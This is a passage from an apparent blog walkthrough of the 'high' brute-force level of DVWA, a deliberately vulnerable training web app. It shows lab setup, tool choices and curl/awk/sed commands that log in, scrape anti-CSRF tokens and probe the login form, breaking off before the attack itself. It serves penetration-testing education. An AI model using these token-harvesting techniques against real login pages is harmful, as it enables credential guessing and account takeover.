  &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#Summary"&gt;Summary&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
&lt;/ul&gt;


&lt;/div&gt;


&lt;a name="Objectives"&gt;&lt;/a&gt;
&lt;h2&gt;Objectives&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;The goal is to &lt;strong&gt;brute force an HTTP login&lt;/strong&gt; page.

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;GET requests&lt;/strong&gt; are made via a &lt;strong&gt;form&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;The web page is in a &lt;strong&gt;sub folder&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-low/"&gt;Low&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Straight forward HTTP GET&lt;/strong&gt; brute force attack via a &lt;strong&gt;web form&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;Bonus: &lt;strong&gt;SQL injection&lt;/strong&gt; (&lt;del&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#*comingsoon*"&gt;See here for more information&lt;/a&gt;&lt;/del&gt;).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-medium/"&gt;Medium&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Extends on the &lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-low/"&gt;"low" level&lt;/a&gt; - HTTP GET attack via a web form.&lt;/li&gt;
&lt;li&gt;Adds in a &lt;strong&gt;static time delay&lt;/strong&gt; (4 seconds) on failed logins.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-high/"&gt;High&lt;/a&gt;&lt;/strong&gt;

&lt;ul&gt;
&lt;li&gt;Extends on the &lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-low/"&gt;"low" level&lt;/a&gt; - HTTP GET attack via a web form.&lt;/li&gt;
&lt;li&gt;Uses an &lt;strong&gt;anti Cross-Site Request Forgery (CSRF) token&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;This time uses a &lt;strong&gt;random time delay&lt;/strong&gt; (between 0 and 4 seconds).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;del&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#comingsoon"&gt;Impossible&lt;/a&gt;&lt;/del&gt;

&lt;ul&gt;
&lt;li&gt;Submits data via HTTP &lt;strong&gt;POST&lt;/strong&gt; via web form&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Accounts will lock out&lt;/strong&gt; after 5 failed logins.

&lt;ul&gt;
&lt;li&gt;Time delay before becoming unlocked (15 minutes).&lt;/li&gt;
&lt;li&gt;Unable to enumerate users on the system.&lt;/li&gt;
&lt;li&gt;Possible &lt;strong&gt;"Denial of Service (DoS)" vector&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;del&gt;&lt;a href="https://blog.g0tmi1k.com/atom.xml#comingsoon"&gt;PHPIDS&lt;/a&gt;&lt;/del&gt;

&lt;ul&gt;
&lt;li&gt;Does not protect against this attack.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;All attack methods are still the same!&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;


&lt;hr /&gt;

&lt;a name="Setup"&gt;&lt;/a&gt;
&lt;h2&gt;Setup&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Main target: &lt;a href="https://github.com/RandomStorm/DVWA/releases"&gt;DVWA v1.10&lt;/a&gt; (Running on &lt;code&gt;Windows Server 2012 Standard ENG x64&lt;/code&gt; + &lt;code&gt;IIS 8&lt;/code&gt;).

&lt;ul&gt;
&lt;li&gt;Target setup &lt;strong&gt;does not matter too much&lt;/strong&gt; for this - &lt;code&gt;Debian&lt;/code&gt;/&lt;code&gt;Arch Linux&lt;/code&gt;/&lt;code&gt;Windows&lt;/code&gt;, &lt;code&gt;Apache&lt;/code&gt;/&lt;code&gt;Nginx&lt;/code&gt;/&lt;code&gt;IIS&lt;/code&gt;, &lt;code&gt;PHP v5.x&lt;/code&gt;, or &lt;code&gt;MySQL&lt;/code&gt;/&lt;code&gt;MariaDB&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;The main target is on the IP (&lt;code&gt;192.168.1.44&lt;/code&gt;), port (&lt;code&gt;80&lt;/code&gt;) and subfolder (&lt;code&gt;/DVWA/&lt;/code&gt;), which is known ahead of time.&lt;/li&gt;
&lt;li&gt;Because the target is Windows, it does not matter about case sensitive URL requests (&lt;code&gt;/DVWA/&lt;/code&gt; vs &lt;code&gt;/dvwa/&lt;/code&gt;).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Attacker: &lt;a href="https://www.kali.org/"&gt;Kali Linux v2&lt;/a&gt; (+ &lt;a href="https://github.com/g0tmi1k/os-scripts/blob/master/kali.sh"&gt;Personal Custom Post-install Script&lt;/a&gt;).

&lt;ul&gt;
&lt;li&gt;Shell prompt will look different (due to &lt;a href="http://www.zsh.org/"&gt;ZSH&lt;/a&gt;/&lt;a href="https://github.com/robbyrussell/oh-my-zsh"&gt;Oh-My-ZSH&lt;/a&gt;).&lt;/li&gt;
&lt;li&gt;Added colour to tools output (thanks to &lt;a href="https://github.com/garabik/grc"&gt;GRC&lt;/a&gt;).&lt;/li&gt;
&lt;li&gt;Pre-installed tools (such as &lt;a href="http://www.mbayer.de/html2text/"&gt;html2text&lt;/a&gt;).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;Both machines are running inside a Virtual Machine (VMware ESXi).&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="Tools"&gt;&lt;/a&gt;
&lt;h2&gt;Tools&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;cURL - Information gathering (used for viewing source code &amp;amp; automate generating sessions).&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/lanjelot/patator"&gt;Patator v0.7&lt;/a&gt; - A brute force tool.

&lt;ul&gt;
&lt;li&gt;So far, we were using v0.5, however this does not have the &lt;code&gt;before_header&lt;/code&gt; function. Time to upgrade!&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://portswigger.net/burp/proxy.html"&gt;Burp Proxy v16.0.1&lt;/a&gt; - Debugging requests &amp;amp; brute force tool

&lt;ul&gt;
&lt;li&gt;Using &lt;a href="https://getfoxyproxy.org/"&gt;FoxyProxy&lt;/a&gt; to switch proxy profiles in Iceweasel.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/danielmiessler/SecLists"&gt;SecLists&lt;/a&gt; - General wordlists.

&lt;ul&gt;
&lt;li&gt;These are common, default and small wordlists.&lt;/li&gt;
&lt;li&gt;Instead of using a custom built wordlist, which has been crafted for our target (e.g. generated with &lt;a href="https://digi.ninja/projects/cewl.php"&gt;CeWL&lt;/a&gt;).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;


&lt;hr /&gt;

&lt;a name="Creating.a.Session.Cookie"&gt;&lt;/a&gt;
&lt;h2&gt;Creating a Session Cookie&lt;/h2&gt;

&lt;p&gt;This was explained back in the first post for the &lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-low/"&gt;low level setting&lt;/a&gt;. Again, this post will be using the &lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-low/"&gt;low level&lt;/a&gt; posting, and expanding on it. I will not be covering certain parts in depth here, because I already mentioned them in other posts. If a certain area is does not make sense, I strongly suggest you read over the &lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-low/"&gt;low security&lt;/a&gt; post first (and maybe the &lt;a href="https://blog.g0tmi1k.com/dvwa/bruteforce-medium/"&gt;medium&lt;/a&gt; one too).&lt;/p&gt;

&lt;p&gt;The cookie command has not changed, plus the target has not changed, which means the output and result will be the same.&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# CSRF=$(curl -s -c dvwa.cookie 'http://192.168.1.44/DVWA/login.php' | awk -F 'value=' '/user_token/ {print $2}' | cut -d &amp;quot;'&amp;quot; -f2)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -b dvwa.cookie --data &amp;quot;username=admin&amp;amp;password=password&amp;amp;user_token=${CSRF}&amp;amp;Login=Login&amp;quot; &amp;quot;http://192.168.1.44/DVWA/login.php&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Document Moved&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;Object Moved&amp;lt;/h1&amp;gt;This document may be found &amp;lt;a &lt;span class="nv"&gt;HREF&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;index.php&amp;quot;&lt;/span&gt;&amp;gt;here&amp;lt;/a&amp;gt;&amp;lt;/body&amp;gt;#
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# sed -i '/security/d' dvwa.cookie&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="Session Cookie" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-high-01.png" /&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Note, depending on the web server and its configuration, &lt;a href="https://blog.g0tmi1k.com/images/dvwa-bruteforce-high-02.png"&gt;it may respond slightly differently&lt;/a&gt; (in the &lt;a href="https://blog.g0tmi1k.com/images/dvwa-bruteforce-high-02.png"&gt;screenshot&lt;/a&gt;: &lt;code&gt;192.168.1.11&lt;/code&gt; is &lt;strong&gt;Nginx&lt;/strong&gt;,&lt;code&gt;192.168.1.22&lt;/code&gt; is &lt;strong&gt;Apache&lt;/strong&gt; &amp;amp; &lt;code&gt;192.168.1.44&lt;/code&gt; is &lt;strong&gt;IIS&lt;/strong&gt;). This is a possible method to fingerprint an IIS web server.&lt;/em&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="Information.Gathering"&gt;&lt;/a&gt;
&lt;h2&gt;Information Gathering&lt;/h2&gt;

&lt;a name="Form.HTML.Code"&gt;&lt;/a&gt;
&lt;h3&gt;Form HTML Code&lt;/h3&gt;

&lt;p&gt;First thing we need to do is to figure out how this level is different from both of the ones before it (low and medium). We could use DVWA's in-built function to allow us to look at the PHP source code (which is stored on the server), however, let's try and figure it out ourselves as we would be doing if it was any other black box assessment. Using the same commands as before, let's see what was returned in the initial HTML response that makes up the web form.&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -b 'security=high' -b dvwa.cookie 'http://192.168.1.44/DVWA/vulnerabilities/brute/' | sed -n '/&amp;lt;form/,/&amp;lt;\/form/p'&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;    &amp;lt;form &lt;span class="nv"&gt;action&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;#&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;method&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;GET&amp;quot;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;      Username:&amp;lt;br /&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;      &amp;lt;input &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;text&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;username&amp;quot;&lt;/span&gt;&amp;gt;&amp;lt;br /&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;      Password:&amp;lt;br /&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;      &amp;lt;input &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;AUTOCOMPLETE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;off&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt;&amp;gt;&amp;lt;br /&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;      &amp;lt;br /&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;      &amp;lt;input &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;submit&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;value&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Login&amp;quot;&lt;/span&gt; &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Login&amp;quot;&lt;/span&gt;&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;      &amp;lt;input &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'hidden'&lt;/span&gt; &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'user_token'&lt;/span&gt; &lt;span class="nv"&gt;value&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'ff383a856f386faa98c327a585b75cda'&lt;/span&gt; /&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;    &amp;lt;/form&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;Unlike the times before, this is not the same! There is now an extra input field between the &lt;code&gt;&amp;lt;form&amp;gt;&amp;lt;/form&amp;gt;&lt;/code&gt; tags, call &lt;code&gt;user_token&lt;/code&gt;! We can highlight this by using &lt;code&gt;diff&lt;/code&gt; to compare the low and high levels.&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -b 'security=low' -b dvwa.cookie 'http://192.168.1.44/DVWA/vulnerabilities/brute/' | sed -n '/&amp;lt;div class=&amp;quot;body_padded/,/&amp;lt;\/div/p' &amp;gt; low.txt&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -b 'security=high' -b dvwa.cookie 'http://192.168.1.44/DVWA/vulnerabilities/brute/' | sed -n '/&amp;lt;div class=&amp;quot;body_padded/,/&amp;lt;\/div/p' &amp;gt; high.txt&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# diff {low,high}.txt&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;14c14
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt;
&lt;/span&gt;&lt;span class="line"&gt;---
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt;       &amp;lt;input &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'hidden'&lt;/span&gt; &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'user_token'&lt;/span&gt; &lt;span class="nv"&gt;value&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'6a7b86cd4e916fbb8f6ce7b64c7fec39'&lt;/span&gt; /&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="Information Gathering Form HTML Code" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-high-03.png" /&gt;&lt;/p&gt;

&lt;p&gt;Based on the name (&lt;code&gt;user_token&lt;/code&gt;), the field is hidden, and as the value appears to be a MD5 value (due to its length and character range), these are all indications of the value being used for an anti-CSRF (Cross-Site Request Forgery) token. If this is true, it will make the attack slightly more complex (as testing each combination could require a new token), and we will not be able to use certain tools (such as Hydra, unless we permanently have it using a proxy).&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="CSRF.Token.Checking"&gt;&lt;/a&gt;
&lt;h3&gt;CSRF Token Checking&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Comparing requests&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;Is the value in the hidden field (&lt;code&gt;user_token&lt;/code&gt;) static? What happens if we make two normal requests and compare the responses?&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -b 'security=high' -b dvwa.cookie 'http://192.168.1.44/DVWA/vulnerabilities/brute/' &amp;gt; high1.txt&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# !curl:gs/high1/high2/    #curl -s -b 'security=high' -b dvwa.cookie 'http://192.168.1.44/DVWA/vulnerabilities/brute/' &amp;gt; high2.txt&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# diff high{1,2}.txt&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;69c69
&lt;/span&gt;&lt;span class="line"&gt;&amp;lt;       &amp;lt;input &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'hidden'&lt;/span&gt; &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'user_token'&lt;/span&gt; &lt;span class="nv"&gt;value&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'549d499897b815789172c2d7cddf6a69'&lt;/span&gt; /&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;---
&lt;/span&gt;&lt;span class="line"&gt;&amp;gt;       &amp;lt;input &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'hidden'&lt;/span&gt; &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'user_token'&lt;/span&gt; &lt;span class="nv"&gt;value&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'3ba4692348281c30d34f23838d304518'&lt;/span&gt; /&amp;gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="CSRF Token Checking" src="https://blog.g0tmi1k.com/images/dvwa-bruteforce-high-04.png" /&gt;&lt;/p&gt;

&lt;p&gt;So it looks when you request a new page, the web app generates a new token (even more proof it is an anti-CSRF token).&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Redirects&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;What happens when we try to send a request? Once again we are pretending we do not know any valid credentials to login with (and there is still not a register/sign up page!), so we will just pick values at random, knowing they will fail (&lt;code&gt;user&lt;/code&gt;/&lt;code&gt;pass&lt;/code&gt;).&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# CSRF=$(curl -s -c dvwa.cookie 'http://192.168.1.44/DVWA/login.php' | awk -F 'value=' '/user_token/ {print $2}' | cut -d &amp;quot;'&amp;quot; -f2)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -b dvwa.cookie --data &amp;quot;username=admin&amp;amp;password=password&amp;amp;user_token=${CSRF}&amp;amp;Login=Login&amp;quot; &amp;quot;http://192.168.1.44/DVWA/login.php&amp;quot; &amp;gt;/dev/null&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# sed -i '/security/d' dvwa.cookie&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# user_token=$(curl -s -b 'security=high' -b dvwa.cookie '192.168.1.44/DVWA/vulnerabilities/brute/' | awk -F 'value=' '/user_token/ {print $2}' | cut -d &amp;quot;'&amp;quot; -f2)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# curl -s -b 'security=high' -b dvwa.cookie &amp;quot;http://192.168.1.44/DVWA/vulnerabilities/brute/?username=user&amp;amp;password=pass&amp;amp;user_token=${user_token}&amp;amp;Login=Login&amp;quot; \&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  &lt;span class="p"&gt;|&lt;/span&gt; sed -n &lt;span class="s1"&gt;'/&amp;lt;div class=&amp;quot;body_padded/,/&amp;lt;\/div/p'&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; html2text
&lt;/span&gt;&lt;span class="line"&gt;****** Vulnerability: Brute Force ******
&lt;/span&gt;&lt;span class="line"&gt;***** Login *****
&lt;/span&gt;&lt;span class="line"&gt;Username:
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;username            &lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;Password:
